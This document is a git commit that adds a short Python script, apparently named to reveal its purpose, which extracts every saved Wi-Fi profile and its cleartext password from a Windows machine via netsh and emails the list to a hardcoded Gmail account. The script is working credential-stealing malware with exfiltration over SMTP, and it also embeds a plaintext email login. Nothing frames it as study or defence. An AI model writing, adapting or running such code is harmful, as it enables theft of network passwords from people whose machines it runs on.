5c782b15d07cacdff0b73fdf9710bd23513aa35b
Satyavart <satyavarty591@gmail.com>
2020-03-05 00:24:34 +0530

    Version 1.0

---
+++ Saved_Wifi_password_sender.py
@@ -0,0 +1,36 @@
+#!usr/bin/env python
+import smtplib
+import subprocess
+import re
+
+def send_mails(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+
+def get_pass():
+    data_network = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
+    networks = re.findall("(?:Profile\s*:\s)(.*?\\r)",data_network.decode())
+    mess = "WiFi Password"
+    mess = mess + "------------------------------------------"
+    Wifi_name = "Network\t:\tPassword"
+    for i in networks:
+        i = i.replace("\r", "")
+        Wifi_name = i
+        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', i, "key=clear"])
+        output = output.decode()
+        Type_net = re.findall("(?:Type\s*:\s)(.*?\\r)", output)[0]
+        password = ""
+        pas = re.findall("(?:Key\sContent\s*:\s)(.*?\\r)", output)
+        if pas:
+            password = pas[0]
+        mess = mess + Wifi_name + " ::::: " + password + "\n\n"
+    send_mails(Email, Pass, mess)
+
+
+Email = "testarena46@gmail.com"
+Pass = "Password@123"
+get_pass()
